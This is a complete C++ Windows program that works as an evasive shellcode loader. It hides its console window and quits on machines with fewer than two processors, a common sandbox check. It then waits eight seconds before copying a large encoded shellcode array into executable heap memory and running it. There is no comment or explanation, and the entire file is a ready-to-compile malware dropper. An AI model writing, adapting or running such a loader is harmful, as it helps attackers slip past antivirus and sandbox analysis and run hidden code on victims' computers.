#include <Windows.h>
#include <iostream>
#include <chrono>
#include <thread>
using namespace std;
#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")

SYSTEM_INFO sysInfo;

int main(void)
{
    GetSystemInfo(&sysInfo);
    if(sysInfo.dwNumberOfProcessors<2){
        return 0;
    }
    std::this_thread::sleep_for(std::chrono::milliseconds(8000));
    unsigned char test[] =
        "\x48\x31\xf6\xda\xc5\x40\xb6\x75\x49\x89\xe7\x48\xba\x48\xf2"
        "\x64\x33\x5a\x9c\xb1\x5d\x66\x41\x81\xe7\xa0\xf5\x49\x0f\xae"
        "\x07\x49\x83\xc7\x08\x4d\x8b\x07\x48\xff\xce\x49\x31\x54\xf0"
        "\x30\x48\x85\xf6\x75\xf3\x01\x7b\x80\x7b\xe2\x8f\x71\xfc\x95"
        "\x4d\xf2\x3b\x49\xfa\xf0\xdc\xac\x02\x92\xea\x9c\xd1\x80\x9d"
        "\x01\xfd\xca\x37\x7e\xdd\x01\x33\x05\x79\x18\x17\x52\xd5\x4e"
        "\x95\x03\xc3\x20\xf4\x45\xd1\x34\x9d\x3d\x01\x3e\x7a\x1e\x27"
        "\x4f\x4a\xa5\x61\x85\x2a\x11\x08\x01\x65\x05\xe1\x3a\xc2\x1f"
        "\x08\xb5\x2f\x04\x8d\xb8\x07\x0d\xdf\xf1\x8a\xf4\x86\x3e\x70"
        "\x3e\x49\x43\x40\x3d\xe1\x3e\x0c\x37\x0e\x3f\x97\xa7\xcd\x3a"
        "\x76\x1f\x34\xfd\x7b\x5d\xc0\x89\xf8\x44\x62\xcb\xf7\x9f\xb7"
        "\x64\xde\xf3\xfa\x97\xae\xe5\x7d\x4e\xdd\xcf\x9e\x46\x4f\x4c"
        "\x82\x16\x06\x45\x5c\x30\x27\x4c\x06\xa1\x4e\xf2\x10\xbf\x1e"
        "\x68\x76\xa5\x4a\x88\x20\x84\xdc\xe4\x8a\x6a\xb4\x31\x4e\x3e"
        "\xd1\x58\x14\xa2\xdd\xc1\xfe\x46\x05\x90\x55\x6b\x82\x54\x13"
        "\x13\x74\x04\x88\x9e\x6c\x62\x5f\x46\x89\xfe\x5d\x6e\xb6\xf1"
        "\x4e\xf0\xc1\x77\x64\x5f\xe1\xe3\x4e\x8a\xd1\x4b\xa6\xf2\x69"
        "\x94\xa3\xe2\x9a\xb2\xc4\xc0\x69\x4c\x99\xf5\x2b\xc2\xb4\xf5"
        "\x60\x70\xed\xa3\x4c\x40\x8d\x5c\xfb\xc8\x31\x3a\x79\x82\x4d"
        "\x2d\x61\xc5\x31\xca\x1f\xc9\x35\xca\xe9\xe0\x35\xb0\x17\xf6"
        "\xf7\x67\xf3\x67\x4d\xfd\x71\x8b\xda\x7b\x07\x9b\x7c\x7c\x38"
        "\x6c\x7e\x82\xf6\x30\xfa\x3d\xc9\x00\xf2\x72\x08\x1a\xf2\xb3"
        "\x83\x54\x25\x7a\x3d\x92\xb3\xf5\xa6\x54\x25\x7a\x41\x98\xf1"
        "\x8d\x61\xa0\x2e\x7e\x3b\xa0\xce\x4f\x39\x7f\x88\x9f\x39\x3a"
        "\xdb\x79\x30\xa0\xf4\xde\xd6\x64\x3b\x26\xb8\xf1\xe4\xc6\x73"
        "\x68\xb8\xb2\xa8\x98\x6f\x26\xca\xaa\xca\xfc\xac\x1c\xf9\x6f"
        "\x7d\xe3\x45\xc5\xac\x40\xf1\x6b\x07\xfb\x7f\x07\x0f\xc9\x21"
        "\x70\x88\xd2\x77\xb5\x78\xaa\xe7\x48\x03\xd7\x5e\x1c\x1a\xdd"
        "\x51\x18\x12\x78\x7e\x8d\xba\x44\xe8\xe2\x5d\xb0\x3e\x45\xd0"
        "\xc5\x18\xe2\xad\xd5\x75\x3d\x17\x5c\x3c\xe6\xd7\xc5\x4a\xff"
        "\x84\xe2\x64\xac\xf3\x3f\x92\x1c\x78\xaa\xa6\x19\x42\x87\x0c"
        "\x54\x49\x78\x82\x00\x88\x85\x3e\x4d\x30\x21\xb5\x50\x4b\x5c"
        "\x0c\x3c\x2e\xe2\x6c\x3a\x53\x9f\x51\xab\x32\xe0\xaa\x79\xca"
        "\x9f\x6f\xdc\xd4\x96\x86\x34\x01\xfb\x7e\x5d\xb9\x63\xea\x09"
        "\x02\x16\xbc\xf1\x2a\xeb\xb6\x00\x88\x85\x7e\x97\x3a\x96\xaf"
        "\x49\xd3\xb1\xdf\x64\x60\xa1\xe5\x47\x86\xa5\x5e\x1c\x78\x21"
        "\x67\xc0\x03\xd7\x5e\x54\xfd\x6a\x93\x2f\x4b\xd6\x8e\x4c\x3c"
        "\x21\xa7\x68\x4a\xd6\x8e\x97\x30\xb2\x04\x1e\x4e\xe6\x97\x54"
        "\x87\x63\xa6\xc3\x37\x5f\x16\x1d\xae\xe2\xd6\x88\xaf\x96\x9f"
        "\xd5\x75\xeb\xe6\x89\x3b\x37\x2b\xed\x34\xa9\xab\x6c\x0b\x92"
        "\x67\xcd\x0d\x72\xbf\x0c\x88\x97\x7a\x55\x79\x7a\x81\x09\x88"
        "\xdb\x16\x58\xf3\xea\xfb\x01\x02\x07\x1f\x97\x7c\x22\xa6\x10"
        "\x42\x8f\x00\x54\x79\x7a\xbe\x12\x42\x8f\x1f\x45\x39\xf0\xaf"
        "\xcb\xef\xf7\x1f\x4e\x87\x4a\xbf\x09\x5a\x8d\x16\x97\x6a\x43"
        "\xac\xb7\xfc\x28\x03\x55\xc6\xdd\x94\x7a\x5c\xe4\x6c\x1c\x78"
        "\xeb\xb1\x01\x8a\x31\x16\x9d\x94\x0a\xe6\x48\x03\x9e\xd7\xf9"
        "\x31\x16\xe5\x48\x1d\xbb\xce\x3e\xc7\x1c\xa6\x1c\x4a\x5e\xba"
        "\x50\xf1\x5b\xa6\xf2\x4f\xa0\x78\x1b\x87\x7f\xab\xc1\xe9\xbf"
        "\x5f\x1d\x78\xaa\xbe\x09\xb9\xfe\xde\x77\x78\x55\x32\x22\x09"
        "\x96\x00\x4c\x28\xe7\xd6\x81\x4e\xe6\x9e\x54\x87\x6a\xaf\xc1"
        "\xc1\x9f\xa1\xdc\x30\x23\x26\x09\xb9\x3d\x51\xc3\x98\x55\x32"
        "\x00\x8a\x10\x34\x0c\x39\xf2\xab\xc1\xe1\x9f\xd7\xe5\x39\x10"
        "\x7e\xed\x77\xb6\xa1\xc9\xfd\x6a\x93\x42\x4a\x28\x90\x69\x9d"
        "\x42\x74\x48\x03\xd7\x16\x9f\x94\xba\xaf\xc1\xe1\x9a\x6f\xd5"
        "\x12\xae\xa6\x10\x4b\x5e\xa7\x5d\xc2\xa8\x3e\x80\x5c\x28\x8b"
        "\x9f\x80\xaa\x99\x1d\x4b\x54\x9a\x3c\x26\x23\x11\x22\x43\x96"
        "\x07\x74\x78\xba\xe7\x48\x42\x8f\x16\x95\x8a\xe2\xd6\x81\x42"
        "\x6d\x06\xb8\x2b\x4f\x18\x9d\x4b\x5e\x9d\x55\xf1\x6d\xaa\x79"
        "\xca\x9e\xd7\xec\x30\x23\x3d\x00\x8a\x2e\x1f\xa6\x7a\x73\x2f"
        "\x17\xfc\x02\xdd\xe4\x78\xd7\xcf\x10\x42\x80\x07\x74\x78\xea"
        "\xe7\x48\x42\x8f\x34\x1c\x22\xeb\x5d\x43\x2c\xd8\x6e\xe3\xad"
        "\xfd\xbe\x09\xb9\xa2\x30\x51\x19\x55\x32\x01\xfc\x19\xb7\x20"
        "\x87\x55\x18\x00\x02\x14\x16\x35\xbe\xe2\x62\xbe\x76\x63\x1f"
        "\xe3\x9f\xf2\x8d\x48\x5a\x9e\x99\xde\x88\x1f\x45\x1e\xfc\x02"
        "\xa7\x57\x9a\xc0\x40\xb2\xae\x62\x46\x0d\xf3\x96\x24\x2b\xb0"
        "\x43\x40\xce\x0b\x95\xab\xff\x9a\xc3\x2d\x67\xa4";

    HANDLE myHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
    void *exec = HeapAlloc(myHeap, HEAP_ZERO_MEMORY, sizeof(test));
    memcpy(exec, test, sizeof(test));

    ((void (*)())exec)();
    return 0;
}